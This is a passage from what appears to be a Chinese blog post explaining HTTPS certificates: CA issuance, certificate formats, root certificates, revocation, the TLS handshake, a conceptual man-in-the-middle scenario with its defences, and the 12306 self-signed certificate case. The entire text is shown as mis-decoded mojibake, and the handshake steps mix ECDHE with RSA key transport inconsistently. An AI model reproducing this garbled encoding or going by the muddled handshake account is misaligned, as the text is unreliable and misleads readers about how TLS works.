å­¦å®‰å…¨ä¼ªéšæœºæ•°ç”Ÿæˆå™¨äº§ç”Ÿä¸€å¯¹è¶³å¤Ÿå¼ºçš„å¯†é’¥ï¼Œé²ä¼¯çš„ç§é’¥ä¸ä¼šå‘ä»»ä½•äººä¼ é€ã€‚<br>7. é²ä¼¯æŠŠä»–çš„å…¬é’¥ï¼Œè¿åŒä¸»ä½“è®¯æ¯ã€ä½¿ç”¨ç›®çš„ç­‰ç»„æˆå‡­è¯ç­¾ç½²è¯·æ±‚ï¼Œä¼ é€ç»™è®¤è¯æœºæ„ä¼Šå‡¡ã€‚<br>8. ä¼Šå‡¡ï¼ˆç”¨å¦å¤–ä¸€äº›æ¸ é“ï¼‰æ ¸å®é²ä¼¯çš„èº«ä»½ï¼ˆå¦‚éªŒè¯å…¬å¸ä¸»ä½“ã€è¥ä¸šæ‰§ç…§ç­‰æ–¹å¼ï¼‰ã€‚<br>9.  å¦‚æœä¼Šå‡¡ä¿¡ä»»è¿™ä¸ªè¯·æ±‚ï¼Œä»–ä¾¿ä½¿ç”¨é²ä¼¯çš„å…¬é’¥å’Œä¸»ä½“è®¯æ¯ï¼ŒåŠ ä¸Šå‡­è¯æœ‰æ•ˆæœŸã€ç”¨é€”ç­‰é™åˆ¶æ¡ä»¶ï¼Œç»„æˆå‡­è¯çš„åŸºæœ¬èµ„æ–™ã€‚<br>10. ä¼Šå‡¡ç”¨è‡ªå·±çš„ç§é’¥å¯¹é²å‹ƒçš„å…¬é’¥åŠ ä¸Šæ•°å­—ç­¾åå¹¶ç”Ÿæˆè¯ä¹¦ã€‚<br>11. ä¼Šå‡¡æŠŠç”Ÿæˆçš„å‡­è¯ä¼ é€ç»™é²ä¼¯ï¼ˆä¼Šå‡¡ä¹Ÿå¯ä»¥é€è¿‡è¯ä¹¦é€æ˜åº¦å…¬å¸ƒä»–ç­¾å‘äº†æ–°çš„è¯ä¹¦ï¼‰ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gam1vcczfzj316f0u0gsw.jpg" alt=""></p><h2 id="è¯ä¹¦çš„å­˜å‚¨æ ¼å¼æ˜¯æ€æ ·çš„ï¼Ÿ"><a href="#è¯ä¹¦çš„å­˜å‚¨æ ¼å¼æ˜¯æ€æ ·çš„ï¼Ÿ" class="headerlink" title="è¯ä¹¦çš„å­˜å‚¨æ ¼å¼æ˜¯æ€æ ·çš„ï¼Ÿ"></a>è¯ä¹¦çš„å­˜å‚¨æ ¼å¼æ˜¯æ€æ ·çš„ï¼Ÿ</h2><p>ç”µå­è¯ä¹¦å¯ä»¥äºŒè¿›åˆ¶æˆ– Base64 å½¢å¼å‚¨å­˜ï¼Œå¸¸è§çš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰©å±•åæœ‰ <code>.cer</code>ã€<code>.crt</code>ã€<code>.der</code>ï¼ŒBase64 çš„æ–‡ä»¶æ‰©å±•ååˆ™é€šå¸¸æ˜¯ <code>.pem</code>ã€‚å¦‚æœæŠŠè¯ä¹¦å’Œç§é’¥ä¸€èµ·å‚¨å­˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ PKCS#12ï¼ˆ<code>.p12</code>ï¼‰æ ¼å¼</p><h2 id="å®¢æˆ·æµè§ˆå™¨å†…ç½®-CA-è¯ä¹¦æ˜¯åœ¨æµè§ˆå™¨è¿˜æ˜¯åœ¨æ“ä½œç³»ç»Ÿï¼Ÿæ˜¯åªå†…ç½®æ ¹è¯ä¹¦å—ï¼Ÿ"><a href="#å®¢æˆ·æµè§ˆå™¨å†…ç½®-CA-è¯ä¹¦æ˜¯åœ¨æµè§ˆå™¨è¿˜æ˜¯åœ¨æ“ä½œç³»ç»Ÿï¼Ÿæ˜¯åªå†…ç½®æ ¹è¯ä¹¦å—ï¼Ÿ" class="headerlink" title="å®¢æˆ·æµè§ˆå™¨å†…ç½® CA è¯ä¹¦æ˜¯åœ¨æµè§ˆå™¨è¿˜æ˜¯åœ¨æ“ä½œç³»ç»Ÿï¼Ÿæ˜¯åªå†…ç½®æ ¹è¯ä¹¦å—ï¼Ÿ"></a>å®¢æˆ·æµè§ˆå™¨å†…ç½® CA è¯ä¹¦æ˜¯åœ¨æµè§ˆå™¨è¿˜æ˜¯åœ¨æ“ä½œç³»ç»Ÿï¼Ÿæ˜¯åªå†…ç½®æ ¹è¯ä¹¦å—ï¼Ÿ</h2><p>æ ¹è¯ä¹¦æ²¡æœ‰ä¸Šå±‚æœºæ„å†ä¸ºå…¶æœ¬èº«ä½œæ•°ä½ç­¾ç« ï¼Œæ‰€ä»¥éƒ½æ˜¯è‡ªç­¾è¯ä¹¦ã€‚è®¸å¤šåº”ç”¨è½¯ä»¶ï¼ˆä¾‹å¦‚æ“ä½œç³»ç»Ÿã€ç½‘é¡µæµè§ˆå™¨ï¼‰ä¼šé¢„å…ˆå®‰è£…å¯è¢«ä¿¡ä»»çš„æ ¹è¯ä¹¦ã€‚æ²¡æœ‰è¯ä¹¦å­˜å‚¨çš„æµè§ˆå™¨åˆ™ä¾èµ–äºæ“ä½œç³»ç»Ÿçš„è¯ä¹¦å­˜å‚¨ã€‚</p><h2 id="æ ¹è¯ä¹¦ä¹Ÿæ˜¯å­˜åœ¨æœ‰æ•ˆæœŸçš„ï¼Œå¦‚ä½•æ›´æ–°æ ¹è¯ä¹¦ï¼Ÿ"><a href="#æ ¹è¯ä¹¦ä¹Ÿæ˜¯å­˜åœ¨æœ‰æ•ˆæœŸçš„ï¼Œå¦‚ä½•æ›´æ–°æ ¹è¯ä¹¦ï¼Ÿ" class="headerlink" title="æ ¹è¯ä¹¦ä¹Ÿæ˜¯å­˜åœ¨æœ‰æ•ˆæœŸçš„ï¼Œå¦‚ä½•æ›´æ–°æ ¹è¯ä¹¦ï¼Ÿ"></a>æ ¹è¯ä¹¦ä¹Ÿæ˜¯å­˜åœ¨æœ‰æ•ˆæœŸçš„ï¼Œå¦‚ä½•æ›´æ–°æ ¹è¯ä¹¦ï¼Ÿ</h2><p>æ ¹è¯ä¹¦é€šå¸¸æœ‰åå‡ å¹´æˆ–å‡ åå¹´çš„æœ‰æ•ˆæœŸï¼Œæ‰€ä»¥åŒæ ·ä¼šè¿‡æœŸï¼Œæ ¹è¯ä¹¦ä¼šé€šè¿‡æµè§ˆå™¨æˆ–è€…æ“ä½œç³»ç»Ÿçš„å‡çº§æ¥å®Œæˆã€‚</p><h2 id="ç”¨æˆ·å¦‚ä½•å¯¹è¯ä¹¦è¿›è¡Œé‰´åˆ«ï¼Ÿ"><a href="#ç”¨æˆ·å¦‚ä½•å¯¹è¯ä¹¦è¿›è¡Œé‰´åˆ«ï¼Ÿ" class="headerlink" title="ç”¨æˆ·å¦‚ä½•å¯¹è¯ä¹¦è¿›è¡Œé‰´åˆ«ï¼Ÿ"></a>ç”¨æˆ·å¦‚ä½•å¯¹è¯ä¹¦è¿›è¡Œé‰´åˆ«ï¼Ÿ</h2><p>å¦‚æœä¸€ä¸ªç”¨æˆ·æƒ³é‰´åˆ«å¦ä¸€ä¸ªè¯ä¹¦çš„çœŸä¼ªï¼Œä»–å°±ç”¨ CA çš„å…¬é’¥å¯¹é‚£ä¸ªè¯ä¹¦ä¸Šçš„ç­¾å­—è¿›è¡ŒéªŒè¯ï¼Œä¸€æ—¦éªŒè¯é€šè¿‡ï¼Œè¯¥è¯ä¹¦å°±è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚</p><ol><li>é²ä¼¯å¯ä»¥éšä¾¿æŠŠå‡­è¯å‘å¤–å‘å¸ƒã€‚</li><li>é²ä¼¯ä¸çˆ±ä¸½ä¸äº‹å…ˆå¯èƒ½äº’ä¸è®¤è¯†ï¼Œä½†é²ä¼¯ä¸çˆ±ä¸½ä¸éƒ½ä¿¡ä»»ä¼Šå‡¡ï¼Œçˆ±ä¸½ä¸ä½¿ç”¨è®¤è¯æœºæ„ä¼Šå‡¡çš„å…¬é’¥éªŒè¯æ•°å­—ç­¾åï¼Œå¦‚æœéªŒè¯æˆåŠŸï¼Œä¾¿å¯ä»¥ä¿¡ä»»é²å‹ƒçš„å…¬é’¥æ˜¯çœŸæ­£å±äºé²ä¼¯çš„ã€‚</li><li>çˆ±ä¸½ä¸å¯ä»¥ä½¿ç”¨å‡­è¯ä¸Šçš„é²å‹ƒçš„å…¬é’¥åŠ å¯†æ˜æ–‡ï¼Œå¾—åˆ°å¯†æ–‡å¹¶ä¼ é€ç»™é²ä¼¯ã€‚</li><li>é²ä¼¯å¯ä»¥å¯ä»¥ç”¨è‡ªå·±çš„ç§é’¥æŠŠå¯†æ–‡è§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡ã€‚</li></ol><p>ç”±äºæµè§ˆå™¨æˆ–æ“ä½œç³»ç»Ÿå†…ç½®äº†æ ¹è¯ä¹¦ï¼Œè¿™äº›æ ¹è¯ä¹¦æ˜¯å€¼å¾—ä¿¡ä»»çš„ï¼Œå› æ­¤ç”¨æˆ·ä»æœ€æœ«çº§çš„è¯ä¹¦å¼€å§‹é€æ­¥è®¤è¯ï¼Œåˆ¤æ–­æœ€ç»ˆçš„è¯ä¹¦æ˜¯å¦ç¬¦åˆç³»ç»Ÿå†…åµŒçš„æ ¹è¯ä¹¦å³å¯ã€‚</p><h2 id="å¦‚æœæŸä¸ªè¯ä¹¦åœ¨æœ‰æ•ˆæœŸå†…è¢«åŠé”€ï¼Œè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ"><a href="#å¦‚æœæŸä¸ªè¯ä¹¦åœ¨æœ‰æ•ˆæœŸå†…è¢«åŠé”€ï¼Œè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ" class="headerlink" title="å¦‚æœæŸä¸ªè¯ä¹¦åœ¨æœ‰æ•ˆæœŸå†…è¢«åŠé”€ï¼Œè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ"></a>å¦‚æœæŸä¸ªè¯ä¹¦åœ¨æœ‰æ•ˆæœŸå†…è¢«åŠé”€ï¼Œè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ</h2><p>å‡å¦‚ X é“¶è¡Œçš„ç§é’¥æ³„éœ²ï¼Œåˆ™å¯èƒ½ä¼šä½¿å®¢æˆ·èµ„é‡‘å—æŸï¼Œæ­¤æ—¶éœ€è¦ç´§æ€¥åŠé”€å…¶è¯ä¹¦ï¼Œåº”è¯¥æ€ä¹ˆæ“ä½œå‘¢ï¼Ÿè¿™ç¯‡æ–‡ç«  â˜<a href="https://zhuanlan.zhihu.com/p/75475419" target="_blank" rel="noopener">ä½ ä¸åœ¨æ„çš„ HTTPS è¯ä¹¦åŠé”€æœºåˆ¶</a> è®²çš„æŒºæ¸…æ¥šçš„ï¼Œæˆ‘å°±ä¸ç­é—¨å¼„æ–§äº†ã€‚</p><h2 id="å…¬é’¥çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å…¬é’¥çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å…¬é’¥çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å…¬é’¥çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</h2><ol><li>æ¶ˆæ¯ç­¾å</li><li>æ¶ˆæ¯åŠ å¯†ï¼Œä»…ç§é’¥æŒæœ‰è€…æ‰èƒ½è§£å¯†æ¶ˆæ¯</li></ol><p>RSA å¯ä»¥è¿›è¡ŒåŠ å¯†å’Œç­¾åï¼Œè€Œ ECDSA åªèƒ½è¿›è¡Œç­¾åã€‚</p><h2 id="æ—¢ç„¶å…¬ç§é’¥å¯ä»¥éªŒè¯å¯¹æ–¹èº«ä»½ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦è¯ä¹¦å‘¢ï¼Ÿ"><a href="#æ—¢ç„¶å…¬ç§é’¥å¯ä»¥éªŒè¯å¯¹æ–¹èº«ä»½ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦è¯ä¹¦å‘¢ï¼Ÿ" class="headerlink" title="æ—¢ç„¶å…¬ç§é’¥å¯ä»¥éªŒè¯å¯¹æ–¹èº«ä»½ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦è¯ä¹¦å‘¢ï¼Ÿ"></a>æ—¢ç„¶å…¬ç§é’¥å¯ä»¥éªŒè¯å¯¹æ–¹èº«ä»½ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦è¯ä¹¦å‘¢ï¼Ÿ</h2><p>è™½ç„¶å…¬ç§é’¥å¯ä»¥å®Œæˆèº«ä»½çš„éªŒè¯ï¼Œä½†æˆ‘ä»¬å¹¶ä¸èƒ½ç¡®å®šå®ƒä»¬æ˜¯å¦å±äºç‰¹å®šå®ä½“ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨â€œè¯ä¹¦â€çš„åŸå› ã€‚è¯ä¹¦ä¸­åŒ…å«äº†å…¬é’¥ã€å®ä½“ä¿¡æ¯ã€æœ‰æ•ˆæœŸã€å¯ä¿¡æ–¹ç­¾åï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥éªŒè¯å¯¹æ–¹çš„çœŸå®èº«ä»½ã€‚</p><h2 id="RSAå¦‚ä½•å®ç°æ•°å­—ç­¾å"><a href="#RSAå¦‚ä½•å®ç°æ•°å­—ç­¾å" class="headerlink" title="RSAå¦‚ä½•å®ç°æ•°å­—ç­¾å"></a>RSAå¦‚ä½•å®ç°æ•°å­—ç­¾å</h2><p>ä¿¡æ¯å‘é€è€…ç”¨å…¶ç§é’¥å¯¹ä»æ‰€ä¼ æŠ¥æ–‡ä¸­æå–å‡ºçš„ç‰¹å¾æ•°æ®ï¼ˆæˆ–ç§°æ•°å­—æŒ‡çº¹ï¼‰è¿›è¡Œ RSA ç®—æ³•æ“ä½œï¼Œä»¥ä¿è¯å‘ä¿¡äººæ— æ³•æŠµèµ–æ›¾å‘è¿‡è¯¥ä¿¡æ¯ï¼ˆå³ä¸å¯æŠµèµ–æ€§ï¼‰ï¼ŒåŒæ—¶ä¹Ÿç¡®ä¿ä¿¡æ¯æŠ¥æ–‡åœ¨ä¼ é€’è¿‡ç¨‹ä¸­æœªè¢«ç¯¡æ”¹ï¼ˆå³å®Œæ•´æ€§ï¼‰ã€‚å½“ä¿¡æ¯æ¥æ”¶è€…æ”¶åˆ°æŠ¥æ–‡åï¼Œå°±å¯ä»¥ç”¨å‘é€è€…çš„å…¬é’¥å¯¹æ•°å­—ç­¾åè¿›è¡ŒéªŒè¯ã€‚ï¼ˆå°†æŸä¸ªäººä¸æŸäººæ‰€è¯´çš„è¯ç»‘å®šåœ¨ä¸€èµ·è¿›è¡Œ hashï¼Œå¦‚æœå…¶ä¸­ä»»ä½•ä¸€é¡¹è¢«ç¯¡æ”¹ï¼Œåˆ™ hash å€¼å°±ä¼šä¸ä¸€è‡´ï¼ˆé˜²ç¯¡æ”¹ï¼‰ï¼›é€šè¿‡å¯¹æ–¹çš„ç‰¹å¾ï¼Œå¦‚å…¬é’¥ï¼Œç¡®å®šå¯¹æ–¹æ— æ³•æŠµèµ–ï¼‰</p><h2 id="HTTPSæ¡æ‰‹è¿‡ç¨‹"><a href="#HTTPSæ¡æ‰‹è¿‡ç¨‹" class="headerlink" title="HTTPSæ¡æ‰‹è¿‡ç¨‹"></a>HTTPSæ¡æ‰‹è¿‡ç¨‹</h2><ol><li>å»ºç«‹ tcp è¿æ¥</li><li>å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ Client Hello(å…¶ä¸­åŒ…æ‹¬å®¢æˆ·ç«¯æ”¯æŒçš„åŠ å¯†æ–¹å¼åˆ—è¡¨)</li><li>æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯è¿”å› Server Helloï¼ˆå…¶ä¸­åŒ…å«æœåŠ¡ç«¯é€‰ä¸­çš„åŠ å¯†æ–¹å¼ï¼‰</li><li>æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯è¿”å› ECDHE å…¬é’¥å’Œè¯ä¹¦(ç”±äº RSA æ²¡æœ‰å‰å‘å®‰å…¨æ€§ï¼ˆForward Secrecyï¼‰ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…è™½ç„¶åœ¨å‘é€çš„è¿‡ç¨‹ä¸­æ— æ³•ç ´è§£ï¼Œä½†æ˜¯å¦‚æœæŠŠç›‘å¬åˆ°çš„åŠ å¯†æµé‡å…ˆå­˜èµ·æ¥ï¼Œåç»­ä¸€æ—¦æ‹¿åˆ°äº†ç§é’¥ï¼Œä¹‹å‰æ‰€æœ‰æµé‡éƒ½å¯ä»¥æˆåŠŸè§£å¯†ã€‚)</li><li>å®¢æˆ·ç«¯è¿›è¡Œè¯ä¹¦çš„ä¿¡ä»»é“¾éªŒè¯ï¼Œè®¤è¯è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼Œæˆæƒå¯†é’¥æ ‡è¯†ç¬¦ä¸å…¶ä¸Šçº§ä¸»é¢˜æ ‡è¯†ç¬¦ç›¸åŒ¹é…ï¼Œæ ¹è¯ä¹¦çš„ä¸»é¢˜æ ‡è¯†ç¬¦ä¸æˆæƒå¯†é’¥æ ‡è¯†ç¬¦ç›¸åŒ</li><li>å®¢æˆ·ç«¯ç”Ÿæˆå¯¹ç§°åŠ å¯†(AES)çš„å¯†é’¥(PSK)ï¼Œå¹¶ç”¨æœåŠ¡ç«¯çš„å…¬é’¥åŠ å¯†å¯†é’¥å‘é€ç»™æœåŠ¡ç«¯</li><li>æœåŠ¡ç«¯ç”¨RSAç§é’¥å¯¹æ”¶åˆ°å®¢æˆ·ç«¯çš„åŠ å¯†å¯†é’¥è§£å¯†</li><li>åŒæ–¹å¼€å§‹é€šä¿¡ï¼Œå¹¶é€šè¿‡ AES åŠ å¯†é€šä¿¡å†…å®¹</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gemafo6t62j316b0iadls.jpg" alt=""></p><h2 id="ä¸ºä»€ä¹ˆä»…åœ¨æ¡æ‰‹é˜¶æ®µä½¿ç”¨-TLSï¼Œè€Œä¸ä¸€ç›´ä½¿ç”¨TLS-é€šä¿¡å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä»…åœ¨æ¡æ‰‹é˜¶æ®µä½¿ç”¨-TLSï¼Œè€Œä¸ä¸€ç›´ä½¿ç”¨TLS-é€šä¿¡å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä»…åœ¨æ¡æ‰‹é˜¶æ®µä½¿ç”¨ TLSï¼Œè€Œä¸ä¸€ç›´ä½¿ç”¨TLS é€šä¿¡å‘¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆä»…åœ¨æ¡æ‰‹é˜¶æ®µä½¿ç”¨ TLSï¼Œè€Œä¸ä¸€ç›´ä½¿ç”¨TLS é€šä¿¡å‘¢ï¼Ÿ</h2><p>ç”±äºéå¯¹ç§°åŠ å¯†ç¼“æ…¢å¹¶å¢åŠ æ•°æ®åŒ…çš„å¤§å°ï¼Œå› æ­¤å‡ ä¹æ‰€æœ‰åè®®(å¦‚ TLSã€SSH)ä»…åœ¨å»ºç«‹å®‰å…¨è¿æ¥æ—¶ä½¿ç”¨éå¯¹ç§°åŠ å¯†ï¼Œè€Œåœ¨æ•°æ®ä¼ è¾“é˜¶æ®µä½¿ç”¨å¯¹ç§°åŠ å¯†ã€‚</p><h2 id="HTTPS-ä¼šæœ‰ä¸­é—´äººæ”»å‡»ï¼ˆMIMTï¼‰é—®é¢˜å—ï¼Ÿ"><a href="#HTTPS-ä¼šæœ‰ä¸­é—´äººæ”»å‡»ï¼ˆMIMTï¼‰é—®é¢˜å—ï¼Ÿ" class="headerlink" title="HTTPS ä¼šæœ‰ä¸­é—´äººæ”»å‡»ï¼ˆMIMTï¼‰é—®é¢˜å—ï¼Ÿ"></a>HTTPS ä¼šæœ‰ä¸­é—´äººæ”»å‡»ï¼ˆMIMTï¼‰é—®é¢˜å—ï¼Ÿ</h2><p>ç­”æ¡ˆæ˜¯ä¼šï¼Œå‰ææ˜¯ä¸­é—´äººå°†å…¶è¯ä¹¦æ¤å…¥é€šè®¯æ–¹çš„ä¸»æœºä¸Šã€‚æˆ‘ä»¬ä»¥ç”¨æˆ· C ä¸æœåŠ¡ç«¯ S ä¸ºä¾‹ã€‚</p><ol><li>å‡è®¾Cçš„ç”µè„‘å·²åœ¨è¾ƒæ—©å‰è¢«Må®‰è£…äº†ç‰¹å®šçš„æ ¹å‡­è¯ï¼ŒMæ‹¥æœ‰å¯¹åº”çš„ç§é’¥</li><li>å½“Cå°è¯•ä¸Så»ºç«‹å®‰å…¨è¿çº¿æ—¶ï¼ŒMä»¥ä»£ç†æœåŠ¡å™¨çš„èº«ä»½å…ˆè¡Œæ”¶åˆ°è¿çº¿è¯·æ±‚</li><li>Mæš‚æ—¶æä¸‹Cçš„è¯·æ±‚ï¼Œè½¬è€Œå»ºç«‹å¦ä¸€æ¡è¿çº¿å‘Sè¯·æ±‚ä»–çš„ç”µå­è¯ä¹¦</li><li>Sçš„ç”µå­è¯ä¹¦å·²å¾—åˆ°ä¸€ä¸ªå—å¹¿æ³›è®¤å¯çš„è®¤è¯æœºæ„æ•°ä½ç­¾ç« ï¼Œå¦‚æœMå¦‚å®è½¬äº¤ç»™Cï¼Œä¸€åˆ‡éƒ½ä¸ä¼šæœ‰é—®é¢˜</li><li>ä½†Mä½¿ç”¨è‡ªå·±çš„ç§é’¥ç­¾å‘ä¸€ä¸ªç”µå­è¯ä¹¦ï¼Œè¯ä¹¦ä¸Šä¸»ä½“åç§°å£°ç§°æ˜¯å±äºSï¼Œå¹¶äº¤ç»™Cï¼Œè€ŒSä¸æ›¾çŸ¥é“</li><li>CéªŒè¯æ”¶åˆ°çš„ç”µå­è¯ä¹¦ï¼Œæ ¹æ®å…¶ä¿¡ä»»é“¾ï¼Œå¥¹æ‰¾åˆ°ç­¾å‘çš„æ ¹è¯ä¹¦</li><li>å¥¹å‘ç°è‡ªå·±çš„ç”µè„‘ä¸­å·²å®‰è£…å¹¶ä¿¡ä»»è¿™æ ·ä¸€ä¸ªæ ¹è¯ä¹¦ï¼Œä¾¿ä¿¡ä»¥ä¸ºçœŸï¼Œå¼€å§‹ä½¿ç”¨è¯ä¹¦ä¸Šçš„å…¬é’¥ä¸Sçš„ç§˜å¯†é€šè®¯</li><li>å…¶å®è¯¥æ ¹è¯ä¹¦å°±æ˜¯Mæ—©å‰å®‰è£…ä¸Šå»ç”¨ä»¥æ¬ºéª—Cï¼Œè¿™æ—¶Mèƒ½å¤Ÿåˆ©ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†Cä¼ å‡ºçš„å¯†æ–‡ï¼Œå¹¶å³æ—¶å†ç”¨å…ˆå‰æ”¶åˆ°ã€SçœŸæ­£çš„ç”µå­è¯ä¹¦ä¸Šçš„å…¬é’¥å†åŠ å¯†ï¼Œå¹¶ä¼ ç»™S</li><li>Sæ”¶åˆ°å¯†æ–‡æ—¶ä¸è™æœ‰è¯ˆï¼Œä»–èƒ½å¤Ÿç”¨è‡ªå·±çš„ç§é’¥è§£å¯†Mä¼ é€è¿‡æ¥çš„å¯†æ–‡</li></ol><p>è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨ Charles ç­‰æŠ“åŒ…å·¥å…·æŠ“å– HTTPS åŒ…æ—¶ä¸ºä»€ä¹ˆè¦å®‰è£…è½¯ä»¶æä¾›è¯ä¹¦çš„åŸå› äº†ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚ä½•é¿å… HTTPS çš„ MIMT å‘¢ï¼Ÿè¦é¿å…ä¸­é—´äººæ”»å‡»ç½®æ¢å‡å†’çš„ç”µå­è¯ä¹¦ï¼ŒHTTPS ç½‘ç«™å¯ä»¥ä½¿ç”¨ <a href="https://zh.wikipedia.org/wiki/HTTPå…¬é’¥å›ºå®š" target="_blank" rel="noopener">HPKP</a> æŒ‡æ˜å…¶å›ºå®šçš„å…¬é’¥ï¼Œæˆ–è€…é€šè¿‡<a href="https://zh.wikipedia.org/wiki/è¯ä¹¦é€æ˜åº¦" target="_blank" rel="noopener">è¯ä¹¦é€æ˜åº¦</a>éªŒè¯è¯ä¹¦ï¼Œè®©ä¸­é—´äººçš„æ¬ºè¯ˆè¯ä¹¦æ— æ³•ä½¿ç”¨ã€‚éªŒè¯è¯ä¹¦æ˜¯å¦è¢«åŠé”€å¯ä»¥é‡‡ç”¨ CRLs (certificate revocation lists)æˆ–è€… OCSP æ–¹å¼ã€‚CRLs(é»‘åå•)å°±æ˜¯å®šæœŸä» CA ä¸‹è½½ä¸€ä¸ªåå•åˆ—è¡¨ï¼Œé‡Œé¢æœ‰åŠé”€çš„è¯ä¹¦åºåˆ—å·ï¼Œè‡ªå·±åœ¨æœ¬åœ°æ¯”å¯¹ä¸€ä¸‹å°±è¡Œï¼Œä¼˜ç‚¹æ˜¯æ•ˆç‡é«˜ï¼Œç¼ºç‚¹æ˜¯ä¸å®æ—¶ï¼›OCSP æ˜¯å®æ—¶è¿æ¥ CA å»éªŒè¯ï¼Œä¼˜ç‚¹æ˜¯å®æ—¶ï¼Œç¼ºç‚¹æ˜¯æ•ˆç‡ä¸é«˜ã€‚</p><h2 id="ä¸ºä»€ä¹ˆæœ‰äº›ç½‘ç«™ä¼šæœ‰è¯ä¹¦ä¸å—ä¿¡ä»»çš„è­¦å‘Šï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæœ‰äº›ç½‘ç«™ä¼šæœ‰è¯ä¹¦ä¸å—ä¿¡ä»»çš„è­¦å‘Šï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæœ‰äº›ç½‘ç«™ä¼šæœ‰è¯ä¹¦ä¸å—ä¿¡ä»»çš„è­¦å‘Šï¼Ÿ"></a>ä¸ºä»€ä¹ˆæœ‰äº›ç½‘ç«™ä¼šæœ‰è¯ä¹¦ä¸å—ä¿¡ä»»çš„è­¦å‘Šï¼Ÿ</h2><p>æœ€ä¸ºè‘—åçš„æ¡ˆä¾‹å°±æ˜¯12306åˆšä¸Šçº¿æ—¶çš„é¡µé¢è­¦å‘Š<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1galxifjtkej30ka0ex75q.jpg" alt=""></p><p>é€ æˆè¿™ä¸ªåŸå› å°±æ˜¯ 12306 çš„è¯ä¹¦æ˜¯è‡ªç­¾çš„ï¼Œè€Œé CA æœºæ„ç­¾å‘çš„ï¼Œè¿™å°±å¯¼è‡´ä¿¡ä»»é“¾æ¡æ— æ³•å®Œæˆï¼Œä»è€Œå‘å‡ºè­¦å‘Šã€‚è€Œå½“æ—¶ 12306 å¯¹è¯¥é—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯è®©ç”¨æˆ·è‡ªè¡Œå®‰è£…æ ¹è¯ä¹¦<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1galxjexgofj311y0ksgqj.jpg" alt=""></p><p>åœ¨ 2017 å¹´ï¼Œ12306 å°±å°†è¯ä¹¦æ›´æ¢äº† CA æœºæ„ç­¾å‘çš„ï¼Œä»è€Œå½»åº•è§£å†³äº†è¯¥é—®é¢˜ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1galxfssk3uj30dg07n40l.jpg" alt=""></p><h2 id="æ•°å­—ç­¾åçš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ•°å­—ç­¾åçš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ•°å­—ç­¾åçš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ•°å­—ç­¾åçš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æ•°ä½å‡­è¯çš„å…¶ä¸­ä¸€ä¸ªæœ€ä¸»è¦å¥½å¤„æ˜¯åœ¨è®¤è¯æ‹¥æœ‰è€…èº«åˆ†æœŸé—´ï¼Œæ‹¥æœ‰è€…çš„æ•æ„Ÿä¸ªäººèµ„æ–™ï¼ˆå¦‚å‡ºç”Ÿæ—¥æœŸã€èº«åˆ†è¯å·ç ç­‰ï¼‰å¹¶ä¸ä¼šä¼ è¾“è‡³ç´¢å–èµ„æ–™è€…çš„ç”µè„‘ç³»ç»Ÿä¸Šã€‚é€è¿‡è¿™ç§èµ„æ–™äº¤æ¢æ¨¡å¼ï¼Œæ‹¥æœ‰è€…æ—¢å¯è¯å®è‡ªå·±çš„èº«åˆ†ï¼Œäº¦ä¸ç”¨è¿‡åº¦æŠ«éœ²ä¸ªäººèµ„æ–™ï¼Œå¯¹ä¿éšœç”µè„‘æœåŠ¡å­˜å–åŒæ–¹çš†æœ‰å¥½å¤„ã€‚</p><p>å°ç»“</p><blockquote><p>ä» HTTPS çš„æµç¨‹ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä¸ªè®¤è¯æµç¨‹æ˜¯ä¸­å¿ƒåŒ–çš„ï¼ŒCA å³ä¸ºæ•´ä¸ªæµç¨‹çš„ä¸­å¿ƒï¼Œå°±åƒä¸­å¤®é“¶è¡Œä¸€æ ·ï¼Œä¸€æ—¦ CA ç§é’¥æ³„éœ²ï¼Œå°†é€ æˆç¾éš¾æ€§åæœã€‚å¦‚æœé‡‡ç”¨å»ä¸­å¿ƒåŒ–è¯¥å¦‚ä½•è®¤è¯å‘¢ï¼Ÿæˆ‘æƒ³å»ä¸­å¿ƒåŒ–çš„æ 